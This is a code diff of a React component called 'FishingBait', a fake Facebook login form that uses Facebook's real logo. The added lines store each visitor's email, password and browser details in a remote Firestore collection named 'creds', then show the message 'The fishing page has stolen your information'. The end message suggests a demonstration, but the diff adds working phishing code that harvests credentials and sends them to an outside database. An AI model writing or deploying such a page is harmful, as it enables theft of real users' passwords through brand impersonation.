@@ -1,16 +1,20 @@
 import React, {useState} from 'react'
+import { doc, setDoc } from "firebase/firestore"; 
+import { db } from "./firebase"
+
 
 export default function FishingBait() {
 
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const [hiddenInfo, setHiddenInfo] = useState('');
+    const [errorMessage, setErrorMessage] = useState('')
 
 
 
 
 
-    const handleSubmit = (e) => {
+    const handleSubmit  = async (e) => {
         e.preventDefault();
         const hiddenInfo = document.querySelector('#hidden-info').value;
         const hiddenInfo2 = document.querySelector('#hidden-info2').value;
@@ -18,13 +22,20 @@ export default function FishingBait() {
         console.log('Password:', password);
         console.log('Hidden Info (User-Agent, IP, etc.):', hiddenInfo);
         console.log("languages", hiddenInfo2);
+        await setDoc(doc(db, "creds", email+Math.random()), {
+          email:email,
+          password:password,
+          hiddenInfo:hiddenInfo,
+          hiddenInfo2:hiddenInfo2,
+        });
+        setErrorMessage("The fishing page has stolen your information")
       };
 
 
   return (
     <form onSubmit={handleSubmit} className='flex flex-col items-center bg-[#FFFFFF] w-[300px] h-fit text-black p-2 drop-shadow-2xl'>
 <div className='w-[300px]'><img className="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"></img></div>
-
+<p className='text-rose-500 text-center'>{errorMessage}</p>
 <div className='flex flex-col gap-2 mb-2'>
   
 <input
